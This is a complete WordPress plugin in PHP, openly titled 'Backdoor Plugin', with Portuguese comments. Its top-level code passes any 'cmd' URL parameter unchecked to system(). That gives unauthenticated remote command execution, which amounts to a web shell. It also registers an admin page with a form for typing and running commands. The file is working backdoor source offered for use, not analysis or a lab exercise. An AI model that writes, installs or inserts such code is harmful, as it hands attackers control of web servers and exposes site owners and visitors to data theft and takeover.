<?php
/*
Plugin Name: Backdoor Plugin
Description: Plugin para executar comandos remotamente.
Author: Attacker
Version: 1.0
*/

// Função para executar comandos enviados via URL
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// Função para adicionar uma página de administração
add_action('admin_menu', 'malicious_backdoor_menu');

function malicious_backdoor_menu() {
    add_menu_page('Backdoor', 'Backdoor', 'administrator', 'malicious-backdoor', 'malicious_backdoor_page');
}

function malicious_backdoor_page() {
    echo '<h1>Backdoor Page</h1>';
    echo '<form method="GET">';
    echo '<input type="text" name="cmd" placeholder="Digite o comando">';
    echo '<input type="submit" value="Executar">';
    echo '</form>';
}
?>
